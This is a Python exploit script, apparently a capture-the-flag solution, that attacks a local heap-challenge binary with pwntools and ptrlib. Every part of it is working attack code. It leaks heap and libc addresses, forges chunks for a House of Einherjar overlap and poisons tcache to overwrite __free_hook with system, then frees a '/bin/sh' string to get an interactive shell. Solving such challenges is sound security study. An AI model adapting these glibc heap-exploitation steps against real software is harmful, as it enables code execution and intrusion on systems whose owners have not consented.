#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./chall_patched")
pwn.context.binary = pwn.ELF(exe.filepath)
libc = ptr.ELF("./libc.so.6")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("localhost", 5000)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    def do_str(size: int, data: bytes):
        io.sendlineafter(b"> ", b"1")
        io.sendlineafter(b"size? ", str(size).encode())
        if size == len(data):
            io.sendafter(b"str? ", data)
        else:
            io.sendlineafter(b"str? ", data)
        io.recvuntil(b"stored at ")
        return int(io.recvuntil(b"!", drop=True))

    def do_tok(idx: int, delim: bytes, recv_size: int) -> bytes:
        io.sendlineafter(b"> ", b"2")
        io.sendlineafter(b"idx? ", str(idx).encode())
        if len(delim) == 1:
            io.sendlineafter(b"delim? ", delim)
        elif len(delim) == 2:
            io.sendafter(b"delim? ", delim)
        else:
            ptr.logger.error("delim is too long.")
        return io.recv(recv_size)

    def do_del(idx: int):
        io.sendlineafter(b"> ", b"3")
        io.sendlineafter(b"idx? ", str(idx).encode())
        return

    def do_exit():
        io.sendlineafter(b"> ", b"4")
        return

    # heap leak
    idx0 = do_str(0x18, b"A" * 0x10)
    idx1 = do_str(0x18, b"B" * 0x10)
    do_del(idx0)
    do_del(idx1)
    idx2 = do_str(0x18, b"")
    heap_base = ptr.u64(do_tok(idx2, b"AA", 6)) - 0x20A
    ptr.logger.info(f"heap_base: {hex(heap_base)}")

    # libc leak
    idx0 = do_str(0x418, b"A")
    idx1 = do_str(0x28, b"A")
    do_del(idx0)
    idx2 = do_str(0x418, b"")
    libc.base = ptr.u64(do_tok(idx0, b"AA", 6)) - 0x3EBC0A

    # fill tcache[0x30]
    idx_list = []
    for _ in range(8):
        idx_list.append(do_str(0xF8, b"A" * 0xF8))
    for idx in idx_list[0:6]:
        do_del(idx)

    # ojamapuyo
    do_str(0x28, b"B" * 0x28)

    # house of einherjar
    idx0 = idx_list[6]
    idx1 = idx_list[7]
    do_tok(idx0, b"\x01", 0)
    payload = b""
    payload += b"A" * 0x18
    payload += ptr.p64(0xE0)
    payload += ptr.p64(heap_base + 0xD10) * 2
    payload += ptr.p64(heap_base + 0xD10 - 0x10) * 2
    payload += b"A" * (0xF0 - len(payload))
    payload += ptr.p64(0xE0)
    do_del(idx0)
    idx0 = do_str(0xF8, payload)
    do_del(idx0)
    do_del(idx1)

    # tcache poisoning
    idx0 = do_str(0xE8, b"B")  # target chunk
    idx1 = do_str(0xE8, b"B")  # dummy
    do_del(idx1)
    do_del(idx0)

    free_hook = unwrap(libc.symbol("__free_hook"))
    payload = b""
    payload += b"A" * 0x18
    payload += ptr.p64(0xE0)
    payload += ptr.p64(free_hook)  # fake link
    idx2 = do_str(0xF8, payload)  # overwriter chunk

    system = unwrap(libc.symbol("system"))
    payload = b""
    payload += ptr.p64(system)
    do_str(0xE8, b"")
    do_str(0xE8, payload)  # chunk on __free_hook

    # call __free_hook("/bin/sh")
    idx0 = do_str(0x18, b"/bin/sh\x00")
    do_del(idx0)

    io.interactive()
    exit()


if __name__ == "__main__":
    main()
